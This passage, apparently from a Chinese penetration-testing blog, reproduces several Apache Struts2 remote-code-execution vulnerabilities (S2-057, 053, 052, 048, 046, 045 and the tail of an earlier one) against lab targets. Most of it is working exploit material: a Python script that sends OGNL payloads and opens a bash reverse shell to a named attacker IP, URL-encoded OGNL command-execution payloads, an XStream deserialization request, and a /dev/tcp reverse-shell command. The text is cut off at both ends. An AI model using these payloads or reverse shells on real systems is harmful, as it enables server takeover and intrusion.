class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># 靶机地址 URL</span><br>target_url = <span class="hljs-string">&quot;http://120.26.80.77:8080/&quot;</span><br><span class="hljs-comment"># 接收反弹shell 攻击机IP</span><br>reverse_ip = <span class="hljs-string">&quot;8.219.161.88&quot;</span><br><span class="hljs-comment"># 接收反弹shell 攻击机端口</span><br>reverse_port = <span class="hljs-string">&quot;9090&quot;</span><br><br>bash_reverse_shell = <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/&quot;</span> + reverse_ip + <span class="hljs-string">&quot;/&quot;</span> + reverse_port + <span class="hljs-string">&quot; 0&gt;&amp;1&quot;</span><br><br>data1 = &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span><br>&#125;<br>data2 = &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;bash -c &#123;echo,&quot;</span> + <span class="hljs-built_in">str</span>(base64.b64encode(bash_reverse_shell.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>) +<span class="hljs-string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;))&#125;&quot;</span><br>&#125;<br><br>res1 = requests.post(target_url, data=data1)<br>res2 = requests.post(target_url, data=data2)<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116100301984.png" alt="image-20240116100301984"></p><p>运行就可以了</p><h1 id="struts2-057"><a href="#struts2-057" class="headerlink" title="struts2-057"></a>struts2-057</h1><p>这个相对于前面的来说比较艰难</p><p>当Struts2的配置满足以下条件时：</p><blockquote><p> alwaysSelectFullNamespace值为true</p><p> action元素未设置namespace属性，或使用了通配符  </p></blockquote><p>namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。  </p><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p> 小于等于 Struts 2.3.34 与  Struts 2.5.16  </p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>  两个版本都是利用com.opensymphony.xwork2.dispatcher.HttpServletResponse对象去打印命令执行后的回显数据  </p><p><strong>2.3.20 版本</strong>  </p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.<span class="hljs-keyword">print</span>%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.<span class="hljs-keyword">exec</span>%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action<br></code></pre></td></tr></table></figure><p>  <strong>2.3.34 版本</strong>  </p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.<span class="hljs-keyword">print</span>%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.<span class="hljs-keyword">exec</span>%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action<br></code></pre></td></tr></table></figure><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/struts2-showcase/</span><span class="hljs-variable">$&#123;(1+1)&#125;</span>/actionChain1.action<br><br><span class="hljs-variable">$&#123;(1+1)&#125;</span> 必须要URL编码<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116102557292.png" alt="image-20240116102557292"></p><p>这里将url编码了，发现1+1 已经变成了2</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>由于看我们的1+1他能执行的话，我们就尝试去利用这个漏洞，直接上命令回显</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/struts2-showcase/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.<span class="hljs-keyword">container</span>%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.<span class="hljs-keyword">clear</span>%28%29%29.%28%23ou.getExcludedClasses%28%29.<span class="hljs-keyword">clear</span>%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.<span class="hljs-keyword">print</span>%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.<span class="hljs-keyword">exec</span>%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/actionChain1.action<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116150835609.png" alt="image-20240116150835609"></p><h1 id="struts2-053"><a href="#struts2-053" class="headerlink" title="struts2-053"></a>struts2-053</h1><p>  Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身  不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。  </p><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1 - Struts 2.3.33,  Struts 2.5 - Struts  2.5.10  </p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问路径</p><blockquote><p><a href="http://192.168.79.128:8080/hello.action">http://192.168.79.128:8080/hello.action</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/20240210230151.png"></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="hljs-string">&#x27;id&#x27;</span>).(#iswin=(@java.lang.System@getProperty(<span class="hljs-string">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class="hljs-string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;<br><br></code></pre></td></tr></table></figure><p>有一个空行不能少了</p><h1 id="struts2-052"><a href="#struts2-052" class="headerlink" title="struts2-052"></a>struts2-052</h1><h2 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h2><p>  Struts 2.1.2 - Struts 2.3.33,  Struts 2.5 - Struts  2.5.12  </p><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/orders/3</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>120.26.80.77:8080<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>2063<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span> </span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span> </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">cipher</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">initialized</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">initialized</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">opmode</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">opmode</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">serviceIterator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.util.Collections$EmptyIterator&quot;</span>/&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">next</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>touch<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/tmp/success<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">redirectErrorStream</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">redirectErrorStream</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;/<span class="hljs-name">next</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;/<span class="hljs-name">iter</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">method</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;/<span class="hljs-name">method</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;<span class="hljs-name">next</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;string&quot;</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">next</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;/<span class="hljs-name">serviceIterator</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">lock</span>/&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;/<span class="hljs-name">cipher</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">ibuffer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ibuffer</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">done</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">done</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">ostart</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">ostart</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">ofinish</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">ofinish</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">closed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">closed</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">consumed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">consumed</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span> </span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>注意command的部分就是我们执行的命令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br></code></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>bash -i &gt;<span class="hljs-symbol">&amp;amp;</span> /dev/tcp/8.219.161.88/9090 0&gt;<span class="hljs-symbol">&amp;amp;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116161257181.png" alt="image-20240116161257181"></p><h1 id="struts2-048"><a href="#struts2-048" class="headerlink" title="struts2-048"></a>struts2-048</h1><h2 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.0.0 - 2.3.32  </p><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>payload</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(<span class="hljs-string">&#x27;id&#x27;</span>).getInputStream())).(#q)&#125;<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="hljs-string">&#x27;id&#x27;</span>).(#iswin=(@java.lang.System@getProperty(<span class="hljs-string">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class="hljs-string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;<br></code></pre></td></tr></table></figure><p>访问指定的目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.128</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">//i</span>ntegration/editGangster.action<br></code></pre></td></tr></table></figure><p>然后使用上面两个payload</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116163219774.png" alt="image-20240116163219774"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116163042885.png" alt="image-20240116163042885"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116163134547.png" alt="image-20240116163134547"></p><h1 id="struts2-046"><a href="#struts2-046" class="headerlink" title="struts2-046"></a>struts2-046</h1><h2 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116164010802.png" alt="image-20240116164010802"></p><p>上传文件1.txt或者其他什么都可以</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116164103229.png" alt="image-20240116164103229"></p><p>将包发过去</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116164124362.png" alt="image-20240116164124362"></p><p>修改这个部分</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116164228112.png" alt="image-20240116164228112"></p><p>添加00截断</p><p>也就是使用%00然后使用url解码</p><p>就出现了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116164332771.png" alt="image-20240116164332771"></p><p>发现确实存在问题</p><p>然后将filename 变成这个</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#nike=<span class="hljs-string">&#x27;multipart/form-data&#x27;</span>).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="hljs-string">&#x27;id&#x27;</span>).(#iswin=(@java.lang.System@getProperty(<span class="hljs-string">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class="hljs-string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;b<br></code></pre></td></tr></table></figure><p>别忘了还存在00截断的问题</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116164456531.png" alt="image-20240116164456531"></p><h1 id="struts2-045"><a href="#struts2-045" class="headerlink" title="struts2-045"></a>struts2-045</h1><h2 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116165548311.png" alt="image-20240116165548311"></p><p>这个和之前的也是一样的只是利用的地方不一样而已</p><p>上传文件，抓包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116165634736.png" alt="image-20240116165634736"></p><p>然后修改content-type</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#nike=<span 